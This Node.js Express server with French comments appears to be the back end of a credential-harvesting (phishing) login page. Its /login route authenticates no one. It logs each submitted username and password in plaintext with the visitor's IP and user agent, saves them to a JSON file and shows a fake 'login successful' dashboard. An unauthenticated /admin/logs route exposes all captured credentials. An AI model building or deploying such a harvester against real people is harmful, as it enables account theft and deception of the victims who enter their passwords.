const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = 3000;

// Middleware pour parser les données JSON et form
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir les fichiers statiques
app.use(express.static('public'));

// Route pour servir la page de connexion
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour recevoir les données de connexion
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const timestamp = new Date().toISOString();
    
    // Données à sauvegarder
    const loginData = {
        timestamp: timestamp,
        username: username,
        password: password,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    };
    
    // Afficher dans la console
    console.log('=== NOUVELLE TENTATIVE DE CONNEXION ===');
    console.log(`Horodatage: ${timestamp}`);
    console.log(`Nom d'utilisateur: ${username}`);
    console.log(`Mot de passe: ${password}`);
    console.log(`Adresse IP: ${req.ip}`);
    console.log(`User-Agent: ${req.get('User-Agent')}`);
    console.log('=====================================\n');
    
    // Sauvegarder dans un fichier JSON
    const logFile = 'login_attempts.json';
    let existingData = [];
    
    try {
        if (fs.existsSync(logFile)) {
            const fileContent = fs.readFileSync(logFile, 'utf8');
            existingData = JSON.parse(fileContent);
        }
    } catch (error) {
        console.error('Erreur lors de la lecture du fichier:', error);
    }
    
    existingData.push(loginData);
    
    try {
        fs.writeFileSync(logFile, JSON.stringify(existingData, null, 2));
        console.log(`Données sauvegardées dans ${logFile}`);
    } catch (error) {
        console.error('Erreur lors de la sauvegarde:', error);
    }
    
    // Réponse au client
    res.json({ 
        status: 'success', 
        message: 'Données reçues',
        redirect: '/dashboard' // Optionnel: redirection après connexion
    });
});

// Route pour voir les tentatives de connexion (optionnel)
app.get('/admin/logs', (req, res) => {
    try {
        const logFile = 'login_attempts.json';
        if (fs.existsSync(logFile)) {
            const fileContent = fs.readFileSync(logFile, 'utf8');
            const loginAttempts = JSON.parse(fileContent);
            res.json(loginAttempts);
        } else {
            res.json([]);
        }
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture des logs' });
    }
});

// Route dashboard (simulation)
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Tableau de bord</title>
            <style>
                body { 
                    background: #000; 
                    color: white; 
                    font-family: Arial, sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                }
            </style>
        </head>
        <body>
            <h1>Connexion réussie !</h1>
            <p>Bienvenue sur votre tableau de bord.</p>
        </body>
        </html>
    `);
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
    console.log(`📊 Logs disponibles sur http://localhost:${PORT}/admin/logs`);
    console.log('En attente des tentatives de connexion...\n');
});

// Gestion propre de l'arrêt du serveur
process.on('SIGINT', () => {
    console.log('\n👋 Arrêt du serveur...');
    process.exit(0);
});